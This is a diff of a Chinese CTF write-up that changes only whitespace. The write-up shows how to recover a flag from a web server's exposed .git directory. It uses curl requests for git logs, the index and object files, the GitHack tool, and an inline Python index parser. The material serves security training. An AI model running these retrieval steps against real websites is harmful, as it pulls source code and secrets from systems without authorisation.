@@ -21,9 +21,9 @@
 
 ```
 .git/index（暂存区）
-  ├─ 50x.txt          → blob: xxx...
-  ├─ 6193686222744.txt → blob: 98f49a...  ← flag 在这里！
-  └─ index.html        → blob: yyy...
+ ├─ 50x.txt → blob: xxx...
+ ├─ 6193686222744.txt → blob: 98f49a... ← flag 在这里！
+ └─ index.html → blob: yyy...
 
 HEAD → 提交树（tree 里可能只有 index.html，没有 flag）
 ```
@@ -36,7 +36,7 @@ HEAD → 提交树（tree 里可能只有 index.html，没有 flag）
 # 1. 分支提交历史（只有 init / add flag）
 curl -s "http://目标/.git/logs/HEAD"
 # 0000000... d0a0dc9 init
-# d0a0dc9... 3418cd6 add flag   <-- 最新提交
+# d0a0dc9... 3418cd6 add flag <-- 最新提交
 
 # 2. logs/refs/stash 不存在 → 不是 stash 变式
 curl -s -o /dev/null -w "%{http_code}" "http://目标/.git/logs/refs/stash"
@@ -70,9 +70,9 @@ python3 GitHack.py "http://目标/.git/"
 # 2. GitHack 的 cache_objects 会自动解析 index，还原暂存区文件到工作区
 cd dist/目标
 ls
-# index.html  6193686222744.txt  50x.txt   <-- flag 文件直接出现在工作区！
+# index.html 6193686222744.txt 50x.txt <-- flag 文件直接出现在工作区！
 cat 6193686222744.txt
-# ctfhub{xxxxxx}   <-- 拿到 flag
+# ctfhub{xxxxxx} <-- 拿到 flag
 ```
 
 #### 解法二（手工 git 命令）
@@ -106,13 +106,13 @@ n=struct.unpack('>I',f.read(4))[0]
 print('DIRC v%d, %d entries' % (ver,n))
 off=12
 for i in range(n):
-    off+=40
-    sha=f.read(20).hex(); off+=20
-    flags=struct.unpack('>H',f.read(2))[0]; off+=2
-    namelen=flags&0xFFF
-    name=f.read(namelen).decode(); off+=namelen
-    off+=(8-((62+namelen)%8))%8
-    print(name, sha)
+ off+=40
+ sha=f.read(20).hex(); off+=20
+ flags=struct.unpack('>H',f.read(2))[0]; off+=2
+ namelen=flags&0xFFF
+ name=f.read(namelen).decode(); off+=namelen
+ off+=(8-((62+namelen)%8))%8
+ print(name, sha)
 "
 # 50x.txt 9071e0a24f654c88aa97a2273ca595e301b7ada5
 # 6193686222744.txt 98f49a5407ea57730560f288ffa994ef431fd613
@@ -121,7 +121,7 @@ for i in range(n):
 # 3. 下载 flag 的 blob 对象并解压
 curl -s "http://目标/.git/objects/98/f49a5407ea57730560f288ffa994ef431fd613" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
 # blob 17\0ctfhub{xxxxxx}
-# ctfhub{xxxxxx}   <-- flag
+# ctfhub{xxxxxx} <-- flag
 ```
 
 ### 本题真实数据
